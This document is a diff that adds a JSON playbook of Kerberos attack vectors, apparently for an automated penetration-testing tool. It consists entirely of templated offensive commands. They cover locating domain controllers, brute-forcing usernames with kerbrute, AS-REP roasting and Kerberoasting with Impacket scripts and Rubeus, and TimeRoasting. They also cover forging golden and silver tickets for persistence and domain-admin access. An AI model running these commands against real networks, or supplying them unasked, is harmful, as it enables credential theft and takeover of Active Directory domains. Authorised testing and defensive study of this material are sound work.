@@ -1,0 +1,139 @@
+{
+  "service": "Kerberos",
+  "description": "Kerberos authentication protocol for Active Directory",
+  "ports": [88],
+  "serviceNames": ["kerberos", "kerberos-sec"],
+  "targetOs": ["Windows"],
+  "vectors": [
+    {
+      "id": "kerberos_find_dc",
+      "name": "Find Domain Controller via Kerberos",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Locate DC by scanning for Kerberos port",
+      "commands": [
+        {
+          "tool": "nmap",
+          "syntax": "nmap -p 88 --open <ip_range>",
+          "description": "Find hosts with Kerberos port open"
+        }
+      ],
+      "outcomes": ["dc_ip"]
+    },
+    {
+      "id": "kerberos_user_enum",
+      "name": "Kerberos User Enumeration",
+      "phase": "reconnaissance",
+      "prerequisites": [],
+      "description": "Enumerate valid usernames via Kerberos",
+      "commands": [
+        {
+          "tool": "kerbrute",
+          "syntax": "kerbrute userenum -d <domain> <userlist>",
+          "description": "Bruteforce usernames via Kerberos"
+        },
+        {
+          "tool": "nmap",
+          "syntax": "nmap -p 88 --script=krb5-enum-users --script-args='krb5-enum-users.realm=<domain>,userdb=<user_list_file>' <target>",
+          "description": "Enumerate users with NSE script"
+        }
+      ],
+      "outcomes": ["username"]
+    },
+    {
+      "id": "kerberos_asrep_roast",
+      "name": "AS-REP Roasting",
+      "phase": "credential_access",
+      "prerequisites": [],
+      "description": "Extract hashes from users with pre-auth disabled",
+      "commands": [
+        {
+          "tool": "GetNPUsers",
+          "syntax": "GetNPUsers.py <domain>/ -usersfile <user_list> -format hashcat -outputfile <hashes.txt>",
+          "description": "Get AS-REP hashes without authentication"
+        },
+        {
+          "tool": "GetNPUsers",
+          "syntax": "GetNPUsers.py <domain>/<user>:<password> -request -format hashcat -outputfile <hashes.txt>",
+          "description": "Get AS-REP hashes with valid creds"
+        },
+        {
+          "tool": "Rubeus",
+          "syntax": "Rubeus.exe asreproast /format:hashcat /outfile:<hashes.txt>",
+          "description": "Windows-based AS-REP roasting"
+        }
+      ],
+      "outcomes": ["asrep_hash", "hash"]
+    },
+    {
+      "id": "kerberos_kerberoasting",
+      "name": "Kerberoasting",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Extract TGS hashes from service accounts",
+      "commands": [
+        {
+          "tool": "GetUserSPNs",
+          "syntax": "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
+          "description": "Request TGS tickets for service accounts"
+        },
+        {
+          "tool": "Rubeus",
+          "syntax": "Rubeus.exe kerberoast",
+          "description": "Windows-based kerberoasting"
+        }
+      ],
+      "outcomes": ["tgs_hash", "hash"]
+    },
+    {
+      "id": "kerberos_timeroasting",
+      "name": "TimeRoasting",
+      "phase": "credential_access",
+      "prerequisites": [],
+      "description": "Extract encryption keys using time-based attack",
+      "commands": [
+        {
+          "tool": "timeroast",
+          "syntax": "timeroast.py <dc_ip> -o <output_log>",
+          "description": "Time-based roasting attack"
+        }
+      ],
+      "outcomes": ["timeroast_hash", "hash"]
+    },
+    {
+      "id": "kerberos_golden_ticket",
+      "name": "Golden Ticket Attack",
+      "phase": "persistence",
+      "prerequisites": ["krbtgt_hash", "domain_sid"],
+      "description": "Create forged TGT with KRBTGT hash",
+      "commands": [
+        {
+          "tool": "ticketer",
+          "syntax": "ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> <username>",
+          "description": "Create golden ticket"
+        },
+        {
+          "tool": "Rubeus",
+          "syntax": "Rubeus.exe golden /rc4:<krbtgt_hash> /user:<user> /domain:<domain> /sid:<domain_sid> /ptt",
+          "description": "Windows golden ticket creation"
+        }
+      ],
+      "outcomes": ["persistence", "domain_admin"]
+    },
+    {
+      "id": "kerberos_silver_ticket",
+      "name": "Silver Ticket Attack",
+      "phase": "persistence",
+      "prerequisites": ["service_hash"],
+      "description": "Create forged TGS for specific service",
+      "commands": [
+        {
+          "tool": "ticketer",
+          "syntax": "ticketer.py -nthash <service_hash> -domain-sid <domain_sid> -domain <domain> -spn <service>/<target> <username>",
+          "description": "Create silver ticket"
+        }
+      ],
+      "outcomes": ["persistence", "service_access"]
+    }
+  ]
+}
